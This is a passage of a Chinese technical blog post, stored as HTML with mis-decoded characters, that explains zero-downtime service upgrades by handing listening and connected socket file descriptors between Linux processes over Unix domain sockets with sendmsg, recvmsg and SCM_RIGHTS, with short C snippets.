data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å®ç°é›¶åœæœºæ›´æ–°ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™ä¸ªæ˜¯å¯ä»¥çš„ã€‚Facebookå°±å®è·µè¿‡ç±»ä¼¼çš„æŠ€æœ¯ï¼Œå®ƒä»¬æŠŠè¿™é¡¹æŠ€æœ¯ï¼Œå«åš&lt;code&gt;Socket Takeover&lt;/code&gt;ã€‚åƒä¸‡åˆ«ç”¨ç™¾åº¦æœè¿™ä¸ªå…³é”®å­—ï¼Œä½ å¾—åˆ°çš„å¯èƒ½æ˜¯ä¸€å †åƒåœ¾ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™ä¹ˆç‰›xçš„æŠ€æœ¯ï¼Œè¿˜è¿™ä¹ˆæœ‰ç”¨ï¼Œä¸ºä»€ä¹ˆå°±æ²¡äººç§‘æ™®å‘¢ï¼Ÿåˆ«é—®æˆ‘ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå¯èƒ½å¤§å®¶ç°åœ¨éƒ½åœ¨çº ç»“æ€ä¹ˆç ”ç©¶èŒ´é¦™è±†çš„èŒ´å­—å†™æ³•ï¼Œæ²¡æ—¶é—´å¹²æ­£äº‹å§ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;é‚£ä»Šå¤©å°±ç”±&lt;code&gt;xjjdog&lt;/code&gt;æ¥ä»‹ç»ä¸€ä¸‹å§ï¼Œé¡ºä¾¿å¢åŠ ä¸€ä¸‹å¤§å®¶ä»¥åçš„å¹ç‰›èµ„æœ¬ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™ä¸ªç‰›xçš„åŠŸèƒ½ï¼Œæ˜¯ç”±Linuxä¸€å¯¹åº•å±‚çš„&lt;code&gt;ç³»ç»Ÿè°ƒç”¨&lt;/code&gt;å‡½æ•°æ‰€å®ç°çš„ï¼š&lt;code&gt;sendmsg()&lt;/code&gt;å’Œ&lt;code&gt;recvmsg()&lt;/code&gt;ã€‚æˆ‘ä»¬ä¸€èˆ¬åœ¨å‘é€ç½‘ç»œæ•°æ®åŒ…çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨sendå‡½æ•°ï¼Œä½†sendå‡½æ•°åªæœ‰åœ¨socketå¤„äºè¿æ¥çŠ¶æ€æ—¶æ‰å¯ä»¥ä½¿ç”¨ï¼›ä¸ä¹‹ä¸åŒçš„æ˜¯ï¼Œsendmsgåœ¨ä»»ä½•æ—¶å€™éƒ½å¯ä»¥ä½¿ç”¨ã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;2. æŠ€æœ¯è¦ç‚¹&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åœ¨cè¯­è¨€ç½‘ç»œç¼–ç¨‹ä¸­ï¼Œé¦–å…ˆè¦é€šè¿‡&lt;code&gt;listen&lt;/code&gt;å‡½æ•°ï¼Œæ¥æ³¨å†Œç›‘å¬åœ°å€ï¼Œç„¶åå†ç”¨acceptå‡½æ•°æ¥æ”¶æ–°è¿æ¥ã€‚æ¯”å¦‚ï¼š&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;code&gt;&lt;span&gt;int&lt;/span&gt;Â listen_fdÂ =Â socket(addr-&amp;gt;ss_family,Â SOCK_STREAM,Â &lt;span&gt;0&lt;/span&gt;);&lt;br/&gt;...&lt;br/&gt;bind(listen_fd,Â (structÂ sockaddrÂ *)Â addr,Â addrlen);&lt;br/&gt;...&lt;br/&gt;&lt;span&gt;int&lt;/span&gt;Â accept_fdÂ =Â accept(fd,Â (structÂ sockaddrÂ *)Â &amp;amp;addr,Â &amp;amp;addrlen);&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬é¦–å…ˆè¦åšçš„ï¼Œå°±æ˜¯æŠŠ&lt;code&gt;listen_fd&lt;/code&gt;ï¼Œä»ä¸€ä¸ªè¿›ç¨‹ï¼Œä¼ é€’åˆ°å¦å¤–ä¸€ä¸ªè¿›ç¨‹ä¸­å»ã€‚æ€ä¹ˆå‘é€å‘¢ï¼Ÿè‚¯å®šæ˜¯è¦é€šè¿‡ä¸€ä¸ªé€šé“çš„ã€‚åœ¨Linuxä¸Šï¼Œé‚£å°±æ˜¯UDSï¼Œå…¨ç§°&lt;code&gt;Unix Domain Sockets&lt;/code&gt;ã€‚&lt;/p&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;2.1 Unix Domain Socketsç›‘å¬&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;UDSï¼ˆUnix Domain Socketsï¼‰åœ¨Linuxä¸Šçš„è¡¨ç°ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚ç›¸æ¯”è¾ƒäºæ™®é€šsocketç›‘å¬åœ¨ç«¯å£ä¸Šï¼Œä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥ç›‘å¬åœ¨ä¸€ä¸ªUDSæ–‡ä»¶ä¸Šï¼Œæ¯”å¦‚&lt;code&gt;/tmp/xjjdog.sock&lt;/code&gt;ã€‚ç”±äºé€šè¿‡è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå¹¶ä¸éœ€è¦èµ°ç½‘å¡ç­‰ç‰©ç†è®¾å¤‡ï¼Œæ‰€ä»¥é€šè¿‡UDSä¼ è¾“æ•°æ®ï¼Œé€Ÿåº¦æ˜¯éå¸¸å¿«çš„ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä½†ä»Šå¤©æˆ‘ä»¬ä¸å…³å¿ƒå®ƒæœ‰å¤šå—ï¼Œè€Œæ˜¯å…³å¿ƒå®ƒå¤šæœ‰ç”¨ã€‚é€šè¿‡bindå‡½æ•°ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡è¿™ä¸ªæ–‡ä»¶æ¥æ”¶è¿æ¥ï¼Œå°±åƒç«¯å£æ¥æ”¶è¿æ¥ä¸€æ ·ã€‚&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt;Â &lt;span&gt;sockaddr_un&lt;/span&gt;Â &lt;span&gt;addr&lt;/span&gt;;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;char&lt;/span&gt;Â *path=&lt;span&gt;&quot;/tmp/xjjdog.sock&quot;&lt;/span&gt;;&lt;br/&gt;&lt;span&gt;int&lt;/span&gt;Â err,Â fd;&lt;br/&gt;fdÂ =Â socket(AF_UNIX,Â SOCK_STREAM,Â &lt;span&gt;0&lt;/span&gt;);&lt;br/&gt;&lt;span&gt;memset&lt;/span&gt;(&amp;amp;addr,Â &lt;span&gt;0&lt;/span&gt;,Â &lt;span&gt;sizeof&lt;/span&gt;(structÂ sockaddr_un));&lt;br/&gt;addr.sun_familyÂ =Â AF_UNIX;&lt;br/&gt;&lt;span&gt;strncpy&lt;/span&gt;(addr.sun_path,Â path,Â &lt;span&gt;strlen&lt;/span&gt;(path));&lt;br/&gt;addrlenÂ =Â &lt;span&gt;sizeof&lt;/span&gt;(addr.sun_family)Â +Â &lt;span&gt;strlen&lt;/span&gt;(path);&lt;br/&gt;errÂ =Â bind(fd,Â (structÂ sockaddrÂ *)Â &amp;amp;addr,Â addrlen);&lt;br/&gt;...&lt;br/&gt;accept_fdÂ =Â accept(fd,Â (structÂ sockaddrÂ *)Â &amp;amp;addr,Â &amp;amp;addrlen);&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-ratio=&quot;0.8207792207792208&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/cvQbJDZsKLqWhqV31WIGTp3IkKeOXQV4rDnf4DMwhfxPKwwNHA5jfFDWxqAHiaqlqADHeI6aJTx2g1Q9DKNhvPA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;385&quot;/&gt;&lt;/p&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™æ ·ã€‚å…¶ä»–çš„è¿›ç¨‹ï¼Œå°±å¯ä»¥é€šè¿‡ä¸¤ç§ä¸åŒçš„æ–¹å¼ï¼Œæ¥è¿æ¥æˆ‘ä»¬çš„æœåŠ¡ã€‚&lt;/p&gt;&lt;ol data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;é€šè¿‡ç«¯å£ï¼šè¿›è¡Œæ­£å¸¸çš„æœåŠ¡ï¼Œè¾“å‡ºæ­£å¸¸çš„ä¸šåŠ¡æ•°æ®ã€‚æ‰§è¡Œæ­£å¸¸ä¸šåŠ¡&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;é€šè¿‡UDSï¼šå¼€å§‹æ¥æ”¶&lt;code&gt;listen_fd&lt;/code&gt;å’Œ&lt;code&gt;accept_fd&lt;/code&gt;ä»¬ã€‚æ‰§è¡Œä¸åœæœºè¿ç§»socketä¸šåŠ¡&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;2.2 fdè¿ç§»æŠ€æœ¯è¦ç‚¹&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æ€ä¹ˆè¿ç§»å‘¢ï¼Ÿæˆ‘ä»¬å…³é”®çœ‹ç¬¬äºŒæ­¥ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å®é™…ä¸Šï¼Œå½“æ–°å‡çº§çš„æœåŠ¡é€šè¿‡UDSè¿æ¥ä¸Šæ¥ï¼Œæˆ‘ä»¬å°±å¼€å§‹ä½¿ç”¨sendmsgå‡½æ•°ï¼Œå°†&lt;code&gt;listen_fd&lt;/code&gt;ç»™è½¬ç§»è¿‡å»ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹sendmsgè¿™ä¸ªå‡½æ•°çš„å‚æ•°ã€‚&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;ssize_t&lt;/span&gt;Â &lt;span&gt;sendmsg&lt;/span&gt;&lt;span&gt;(&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â socket,&lt;br/&gt;Â Â Â Â &lt;span&gt;const&lt;/span&gt;Â structÂ msghdrÂ *message,&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â flags&lt;br/&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;socketå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬çš„UDSè¿æ¥ã€‚å…³é”®åœ¨äº&lt;code&gt;msghdr&lt;/code&gt;è¿™ä¸ªç»“æ„ä½“ã€‚&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt;Â &lt;span&gt;msghdr&lt;/span&gt;Â {&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;void&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â Â Â *msg_name;Â Â Â Â Â Â &lt;span&gt;/*Â optionalÂ addressÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;socklen_t&lt;/span&gt;Â Â Â Â Â Â Â msg_namelen;Â Â Â Â &lt;span&gt;/*Â sizeÂ ofÂ addressÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;&lt;span&gt;struct&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â &lt;span&gt;iovec&lt;/span&gt;Â *&lt;span&gt;msg_iov&lt;/span&gt;;&lt;/span&gt;Â &lt;span&gt;/*Â scatter/gatherÂ arrayÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â msg_iovlen;Â Â Â Â Â &lt;span&gt;/*Â #Â elementsÂ inÂ msg_iovÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;void&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â Â Â *msg_control;Â Â Â &lt;span&gt;/*Â ancillaryÂ data,Â seeÂ belowÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;socklen_t&lt;/span&gt;Â Â Â Â Â Â Â msg_controllen;Â &lt;span&gt;/*Â ancillaryÂ dataÂ bufferÂ lenÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â msg_flags;Â Â Â Â Â Â &lt;span&gt;/*Â flagsÂ onÂ receivedÂ messageÂ */&lt;/span&gt;&lt;br/&gt;};&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å…¶ä¸­ï¼Œ &lt;code&gt;msg_iov&lt;/code&gt;è¡¨ç¤ºè¦æ­£å¸¸å‘é€çš„æ•°æ®ï¼Œæ¯”å¦‚&lt;code&gt;HelloWord&lt;/code&gt;ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸¤ä¸ª&lt;code&gt;ancillary&lt;/code&gt; (é™„å±çš„) çš„å˜é‡ï¼Œæä¾›äº†é™„åŠ çš„åŠŸèƒ½ï¼Œé‚£å°±æ˜¯å˜é‡&lt;code&gt;msg_control&lt;/code&gt;å’Œ&lt;code&gt;msg_controllen&lt;/code&gt;ã€‚å…¶ä¸­ï¼Œ&lt;code&gt;msg_control&lt;/code&gt;åˆæŒ‡å‘äº†å¦å¤–ä¸€ä¸ªç»“æ„ä½“&lt;code&gt;cmsghdr&lt;/code&gt;ã€‚&lt;/p&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt;Â &lt;span&gt;cmsghdr&lt;/span&gt;Â {&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;socklen_t&lt;/span&gt;Â cmsg_len;Â Â Â Â &lt;span&gt;/*Â dataÂ byteÂ count,Â includingÂ headerÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â Â Â Â Â Â Â cmsg_level;Â Â &lt;span&gt;/*Â originatingÂ protocolÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;int&lt;/span&gt;Â Â Â Â Â Â Â cmsg_type;Â Â Â &lt;span&gt;/*Â protocol-specificÂ typeÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;/*Â followedÂ byÂ */&lt;/span&gt;&lt;br/&gt;Â Â Â Â &lt;span&gt;unsigned&lt;/span&gt;Â &lt;span&gt;char&lt;/span&gt;Â cmsg_data[];&lt;br/&gt;};&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­ï¼Œæœ‰ä¸€ä¸ªå«åš&lt;code&gt;cmsg_type&lt;/code&gt;çš„æˆå‘˜å˜é‡ï¼Œæ˜¯æˆ‘ä»¬å®ç°socketè¿ç§»çš„å…³é”®ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å®ƒå…±æœ‰ä¸‰ä¸ªç±»å‹ã€‚&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;SCM_RIGHTS&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;SCM_CREDENTIALS&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;SCM_SECURITY&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å…¶ä¸­ï¼Œ&lt;code&gt;SCM_RIGHTS&lt;/code&gt;å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ï¼Œå®ƒå…è®¸æˆ‘ä»¬ä»ä¸€ä¸ªè¿›ç¨‹ï¼Œå‘é€ä¸€ä¸ªæ–‡ä»¶å¥æŸ„åˆ°å¦å¤–ä¸€ä¸ªè¿›ç¨‹ã€‚&lt;/p&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-ratio=&quot;0.5135566188197768&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/cvQbJDZsKLqWhqV31WIGTp3IkKeOXQV47ojcFZ4sv0ic4ib8svdJniafVSWkE2aFuqpDpX6NFicG9FzT4NrhL4cmPg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;627&quot;/&gt;&lt;/p&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;pre data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt;Â &lt;span&gt;msghdr&lt;/span&gt;Â &lt;span&gt;msg&lt;/span&gt;;&lt;/span&gt;&lt;br/&gt;...&lt;br/&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt;Â &lt;span&gt;cmsghdr&lt;/span&gt;Â *&lt;span&gt;cmsg&lt;/span&gt;Â =Â &lt;span&gt;CMSG_FIRSTHDR&lt;/span&gt;(&amp;amp;&lt;span&gt;msg&lt;/span&gt;);&lt;/span&gt;&lt;br/&gt;cmsg-&amp;gt;cmsg_levelÂ =Â SOL_SOCKET;&lt;br/&gt;cmsg-&amp;gt;cmsg_typeÂ =Â SCM_RIGHTS;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//socketÂ fdåˆ—è¡¨ï¼Œè®¾ç½®åœ¨cmsg_dataä¸Š&lt;/span&gt;&lt;br/&gt;&lt;span&gt;int&lt;/span&gt;Â *fdsÂ =Â (&lt;span&gt;int&lt;/span&gt;Â *)Â CMSG_DATA(cmsg);&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä¾é &lt;code&gt;sendmsg&lt;/code&gt;å‡½æ•°ï¼Œsocketå¥æŸ„å°±å‘é€åˆ°å¦å¤–ä¸€ä¸ªè¿›ç¨‹äº†ã€‚&lt;/p&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;3. æ¥æ”¶å’Œè¿˜åŸ&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;åŒæ ·çš„ï¼Œ&lt;code&gt;recvmsg&lt;/code&gt;å‡½æ•°ï¼Œå°†ä¼šæ¥æ”¶è¿™éƒ¨åˆ†æ•°æ®ï¼Œç„¶åå°†å…¶è¿˜åŸæˆ&lt;code&gt;cmsghdr&lt;/code&gt;ç»“æ„ä½“ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥ä»&lt;code&gt;cmsg_data&lt;/code&gt;ä¸­è·å–å¥æŸ„åˆ—è¡¨ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;ä¸ºä»€ä¹ˆèƒ½è¿™ä¹ˆåšå‘¢ï¼Ÿå› ä¸ºsocketå¥æŸ„ï¼Œåœ¨æŸä¸ªè¿›ç¨‹é‡Œï¼Œå…¶å®åªæ˜¯ä¸€ä¸ªå¼•ç”¨ã€‚çœŸæ­£çš„fdå¥æŸ„ï¼Œå…¶å®æ˜¯æ”¾åœ¨å†…æ ¸ä¸­çš„ã€‚æ‰€è°“çš„è¿ç§»ï¼Œåªä¸è¿‡æ˜¯æŠŠä¸€ä¸ªæŒ‡é’ˆï¼Œä»ä¸€ä¸ªè¿›ç¨‹ä¸­å»æ‰ï¼Œå†åŠ åˆ°å¦å¤–ä¸€ä¸ªè¿›ç¨‹ä¸­ç½¢äº†ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;fdå¥æŸ„çš„å±æ€§ï¼Œæœ‰ä¸¤ç§æƒ…å†µã€‚&lt;/p&gt;&lt;ul data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;ç›‘å¬fdï¼Œç›´æ¥è°ƒç”¨&lt;code&gt;accept&lt;/code&gt;å‡½æ•°ä½œç”¨åœ¨fdä¸Šå³å¯&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ™®é€šfdï¼Œéœ€è¦å°†å…¶è¿˜åŸæˆæ­£å¸¸çš„socket&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-ratio=&quot;0.683206106870229&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/cvQbJDZsKLqWhqV31WIGTp3IkKeOXQV4sF3JZRe7ayBZq3sqj1Hic3b5ZorSh4xFxLF1dPvrfzCKZcP7sQzZiaLw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;524&quot;/&gt;&lt;/p&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span&gt;å›¾ç‰‡æ¥è‡ªè®ºæ–‡ï¼š(Zero Downtime Release: Disruption-free Load Balancing of a Multi-Billion User Website)&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¯¹äºæ™®é€šfdï¼Œè‚¯å®šè¦è°ƒç”¨ä¸åŸæ–°è¿æ¥åˆ°æ¥æ—¶&lt;code&gt;ç›¸åŒçš„&lt;/code&gt;ä»£ç é€»è¾‘ã€‚æ‰€ä»¥ï¼Œä¸€ä¸ªå¤§ä½“çš„è¿ç§»è¿‡ç¨‹ï¼ŒåŒ…æ‹¬ï¼š&lt;/p&gt;&lt;ol data-tool=&quot;mdniceç¼–è¾‘å™¨&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;é¦–å…ˆè¿ç§»listener fdåˆ°æ–°è¿›ç¨‹ï¼Œå¹¶å¼€å¯ç›‘å¬ï¼Œä»¥ä¾¿æ–°è¿›ç¨‹èƒ½å¿«é€Ÿæ¥æ”¶æ–°çš„è¯·æ±‚ã€‚å¦‚æœæˆ‘ä»¬å¼€å¯äº†&lt;code&gt;SO_REUSEADDR&lt;/code&gt;é€‰é¡¹ï¼Œæ–°è€æœåŠ¡ç”šè‡³èƒ½å¤Ÿä¸€èµ·è¿›è¡ŒæœåŠ¡&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;ç­‰å¾…æ–°è¿›ç¨‹é¢„çƒ­ä¹‹åï¼Œåœæ‰åŸè¿›ç¨‹çš„ç›‘å¬&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;è¿ç§»åŸè€è¿›ç¨‹ä¸­çš„å¤§é‡socketï¼Œè¿™äº›socketå¯èƒ½æœ‰æ•°ä¸‡æ¡ï¼Œæœ€å¥½ç¼–ç èƒ½çœ‹åˆ°è¿ç§»è¿›åº¦&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;æ–°è¿›ç¨‹æ¥æ”¶åˆ°è¿™äº›socketï¼Œé™†ç»­å°†å…¶è¿˜åŸä¸ºæ­£å¸¸çš„è¿æ¥ã€‚ç›¸å½“äºç•¥è¿‡äº†accepté˜¶æ®µï¼Œç›´æ¥å°±è·å–äº†socketåˆ—è¡¨&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;è¿ç§»å®Œæ¯•ï¼Œè€è¿›ç¨‹å°±ç©ºè½¬äº†ï¼Œæ­¤æ—¶å¯ä»¥å®‰å…¨çš„åœæ‰&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;span/&gt;4. End&lt;/h2&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;è¿™æ˜¯ä¸€é¡¹é»‘ç§‘æŠ€ï¼Œå…¶å®å·²ç»åœ¨ä¸€äº›ä¸»æµçš„åº”ç”¨ä¸­ä½¿ç”¨äº†ã€‚ä½ ä¼šçœ‹åˆ°ä¸€äº›éå¸¸çœ¼ç†Ÿçš„è½¯ä»¶ï¼Œè¿™é¡¹åŠŸèƒ½æ˜¯å®ƒä»¬çš„ä¸€å¤§å–ç‚¹ã€‚æ¯”å¦‚&lt;code&gt;HAProxy&lt;/code&gt;ï¼Œè¿è¡Œåœ¨4å±‚ç½‘ç»œçš„è´Ÿè½½å‡è¡¡ï¼›æ¯”å¦‚&lt;code&gt;Envoy&lt;/code&gt;ï¼ŒIstioé»˜è®¤çš„æ•°æ®å¹³é¢è½¯ä»¶ï¼Œä½¿ç”¨ç±»ä¼¼çš„æŠ€æœ¯å®Œæˆçƒ­é‡å¯ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å…¶å®ï¼Œåœ¨servicemeshçš„æ¨è¿›è¿‡ç¨‹ä¸­ï¼Œproxyçš„æ›¿æ¢ï¼Œä¹Ÿä¼šä½¿ç”¨ç±»ä¼¼çš„æŠ€æœ¯ï¼Œæ¯”å¦‚SOFAã€‚å¯¹äºgolangå’ŒCè¯­è¨€æ¥è¯´ï¼Œç”±äºAPIæš´éœ²çš„æ¯”è¾ƒå¥½ï¼Œè¿™ç§åŠŸèƒ½å¯ä»¥å¾ˆå®¹æ˜“çš„å®ç°ï¼›ä½†åœ¨Javaä¸­ï¼Œå´æœ‰ä¸å°‘çš„å›°éš¾ï¼Œå› ä¸ºJavaçš„è·¨å¹³å°ç‰¹æ€§ä¸ä¼šåšè¿™ç§ä¸ºLinuxå®šåˆ¶çš„APIã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¯ä»¥çœ‹åˆ°ï¼Œsendmsgå’Œrecvmsgè¿™ä¸¤ä¸ªå‡½æ•°ï¼Œå¯ä»¥å®ç°çš„åŠŸèƒ½éå¸¸çš„é…·ã€‚å®ƒæ¯”è¾ƒé€‚åˆæ— çŠ¶æ€çš„proxyæœåŠ¡ï¼Œå¦‚æœæœåŠ¡å†…æœ‰çŠ¶æ€å­˜ç•™ï¼Œè¿™ç§è¿ç§»å¹¶ä¸è§å¾—å®‰å…¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°è¯•æŠŠæ­¤é¡¹æŠ€æœ¯è¿ç”¨åœ¨ä¸€äº›ä¸­é—´ä»¶ä¸Šã€‚ä½†æ— è®ºå¦‚ä½•ï¼Œè¿™ç§é»‘ç§‘æŠ€ï¼Œæœ‰ä¸€ç§åˆ«æ ·çš„æš´åŠ›ç¾ï¼Œè‚¯å®šä¼šæŠŠwindows serverç”¨æˆ·ç»™é¦‹å“­çš„ã€‚&lt;/p&gt;&lt;blockquote data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;&lt;p&gt;ä½œè€…ç®€ä»‹ï¼šå°å§å§å‘³é“ (xjjdog)ï¼Œä¸€ä¸ªä¸å…è®¸ç¨‹åºå‘˜èµ°å¼¯è·¯çš„å…¬ä¼—å·ã€‚èšç„¦åŸºç¡€æ¶æ„å’ŒLinuxã€‚åå¹´æ¶æ„ï¼Œæ—¥ç™¾äº¿æµé‡ï¼Œä¸ä½ æ¢è®¨é«˜å¹¶å‘ä¸–ç•Œï¼Œç»™ä½ ä¸ä¸€æ ·çš„å‘³é“ã€‚æˆ‘çš„ä¸ªäººå¾®ä¿¡xjjdog0ï¼Œæ¬¢è¿æ·»åŠ 